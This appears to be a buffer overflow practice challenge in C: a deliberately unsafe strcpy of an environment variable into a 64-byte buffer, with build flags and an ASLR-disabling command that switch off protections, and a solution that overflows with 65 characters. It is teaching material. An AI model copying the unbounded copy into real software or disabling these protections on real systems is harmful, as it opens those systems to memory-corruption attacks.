/* ========================= */
/*     _________________     */
/*   //                 \\   */
/*  || HOW TO COMPILE IT ||  */
/*   \\_________________//   */
/*                           */
/* ========================= */
/*                           */
/*  GCC Args:                */
/*    -fno-stack-protector   */
/*    -z execstack           */
/*    -no-pie                */
/*    -m32  ((32-bit arch))  */
/*                           */
/* ========================= */
/*                           */
/*  Disable Random Addrsses  */
/*     echo 0 >              */
/*    /proc/sys/kernel/randomize_va_space
/*                           */
/* ========================= */
/*                           */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main (int argc, char *argv[])
{
    // write volatile if the value can change unexpectedly (it is not necessary to exploit the program)
    volatile int flag = 0;
    char buffer[64];
    // get enviromental variable
    char *enviromental = getenv ("STACK_ENV");

    // if exist...
    if (enviromental != NULL)
    {
        // vuln function (see "man 3 strcpy" bug section)
        strcpy (buffer, enviromental);

        if (flag)
        {
            // goodboy
            printf ("Test completed successfully\n");
            return 0;
        }
    }
    
    // ... if does not exist
    fprintf (stderr, "Try again. STACK_ENV value: %s\n", enviromental);

    return 0xDEAD;
}


/*                           */
/* ========================= */
/*     _________________     */
/*   //                 \\   */
/*  ||  HOW TO SOLVE IT ||   */
/*   \\_________________//   */
/*                           */
/* ========================= */
/*                           */
/*  The value of the "flag"  */
/*  variable is always 0.    */
/*                           */
/*  Variables are stored in  */
/*  the Stack.               */
/*                           */
/*  As a buffer it has 64    */
/*  spaces, if we introduce  */
/*  a greater number of      */
/*  digits, we will          */
/*  overwrite the previous   */
/*  variables.               */
/*                           */
/*  STACK_ENV variable       */
/*  needs to be declared.    */
/*  STACK_ENV value will be  */
/*  copied in buffer var.    */
/*                           */
/* ========================= */
/*                           */
/*  Commands:                */
/*  export STACK_ENV=`python */
/*    -c "print 'A'*65"`     */
/*  export STACK_ENV=`perl   */
/*    -e "print 'A'x65"`     */
/*                           */
/* ========================= */